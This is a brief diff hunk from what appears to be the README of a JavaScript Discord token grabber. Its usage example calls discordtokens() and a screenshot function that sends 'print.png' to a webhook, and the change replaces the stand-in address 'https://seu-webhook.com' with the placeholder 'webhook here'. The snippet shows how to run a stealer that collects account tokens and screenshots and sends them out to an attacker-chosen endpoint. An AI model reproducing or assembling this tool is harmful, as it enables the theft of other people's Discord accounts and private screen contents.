@@ -95,7 +95,7 @@ const { screenshot } = require('./modulos/screenshot')
 
 discordtokens()
 
-screenshot('print.png', 'https://seu-webhook.com')
+screenshot('print.png', 'webhook here')
 ```
 
 ---
